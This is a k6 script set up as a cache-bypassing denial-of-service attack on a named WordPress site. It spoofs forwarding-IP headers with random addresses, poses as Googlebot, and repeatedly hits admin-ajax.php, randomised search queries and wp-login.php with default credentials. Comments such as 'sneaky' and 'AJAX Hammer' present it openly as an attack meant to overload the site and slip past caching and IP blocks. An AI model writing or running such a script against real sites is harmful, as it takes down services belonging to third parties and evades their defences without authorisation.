import http from 'k6/http';
import { sleep } from 'k6';

export const options = {
  scenarios: {
    bypass_attack: {
      executor: 'constant-arrival-rate',
      rate: 5,              // We drop the rate to be "sneaky"
      timeUnit: '1s',
      duration: '3m',
      preAllocatedVUs: 50,
      maxVUs: 200,
    },
  },
};

// Helper to generate a random IP
function randomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

export default function () {
  const TARGET_URL = 'https://funseacorfu.gr/';

  const params = {
    headers: {
      'X-Forwarded-For': randomIP(),
      'X-Real-IP': randomIP(),
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    },
  };

  // 1. The AJAX Hammer: Hits the heart of WordPress
  // Most caches don't touch admin-ajax.php
  http.post(`${TARGET_URL}/wp-admin/admin-ajax.php`, { action: 'get_results' }, params);

  // 2. The Search Bypass: Unique query to force a DB scan
  http.get(`${TARGET_URL}/?s=${Math.random().toString(36)}`, params);

  // 3. The Login Heavy-Lifter: Forces PHP to work
  http.post(`${TARGET_URL}/wp-login.php`, { log: 'admin', pwd: 'password' }, params);

  sleep(1);
}